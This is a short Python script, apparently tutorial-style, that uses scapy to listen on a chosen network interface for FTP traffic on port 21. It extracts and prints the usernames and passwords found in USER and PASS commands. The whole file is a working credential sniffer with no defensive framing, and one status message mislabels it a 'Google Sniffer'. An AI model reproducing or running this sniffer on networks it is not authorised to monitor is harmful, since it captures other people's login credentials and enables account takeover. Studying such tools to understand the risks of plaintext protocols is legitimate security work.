import re
import optparse
from scapy.all import *

def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print '[*] Detected FTP Login to ' + str(dest)
        print '[+] Detected FTP Login to ' + str(user[0])
        if pswd:
            print '[+] Password: ' + str(pswd[0])

def main():
    usage = "%prog -i <interface>"
    parser = optparse.OptionParser(usage, version="%prog 1.0")
    parser.add_option('-i', dest='interface', type='string',\
                    help='specify interface to listen on')
    (options, args) = parser.parse_args()

    #options.interface = 'Intel(R) Ethernet Connection I218-V'
    conf.iface = options.interface
    if conf.iface is None:
        print parser.print_help()
        exit(0)

    try:
        print '[*] Starting Google Sniffer...'
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()
